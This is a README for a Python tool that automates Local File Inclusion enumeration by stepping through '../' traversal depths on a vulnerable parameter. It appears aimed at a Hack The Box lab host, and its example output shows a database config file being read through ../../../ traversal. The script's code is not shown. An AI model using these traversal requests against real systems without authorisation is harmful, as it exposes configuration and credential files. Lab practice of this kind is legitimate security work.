# LFI Enumerator

## Overview

LFI Enumerator is a Python script that automates **Local File Inclusion (LFI) enumeration** by iterating through `../` sequences until it finds a valid file path.

## Features

- **Takes a raw HTTP request as input**
- **Finds the correct depth (`../`) for LFI traversal**
- **Stops when a valid file (HTTP 200 OK) is found**
- **Extracts and displays the file content**
- **Customizable `max_depth` for deeper enumeration**

## Installation

Clone the repository and install dependencies:

```bash
git clone https://github.com/YOUR_GITHUB_USERNAME/LFI-Enumerator.git
cd LFI-Enumerator
pip install -r requirements.txt
```

## Usage

1. **Save the vulnerable HTTP request** into a text file (`request.txt`).
    
    - Replace the vulnerable filename with `{enumerate}`:
    
    ```plaintext
    GET /download?filename={enumerate} HTTP/1.1
    Host: api.heal.htb
    Authorization: Bearer eyJhbGciOi...
    ```
    
2. **Run the script and enter the file path to enumerate:**
    
    ```bash
    python3 lfi_enumerator.py
    ```
    
3. **Enter the file to search for**, e.g., `/config/database.yml`
    
    ```plaintext
    Enter the file path to enumerate (e.g., /config/database.yml): /config/database.yml
    ```
    

## Example Output

```
[*] Trying: http://api.heal.htb/download?filename=../config/database.yml
[*] Trying: http://api.heal.htb/download?filename=../../config/database.yml
[*] Trying: http://api.heal.htb/download?filename=../../../config/database.yml

[✅] File found at traversal depth: 3
[*] URL: http://api.heal.htb/download?filename=../../../config/database.yml

[📄] File Content:
production:
  adapter: sqlite3
  database: db/production.sqlite3
  pool: 5
  timeout: 5000
```

## Requirements

Python 3 is required. Install dependencies with:

```bash
pip install -r requirements.txt
```
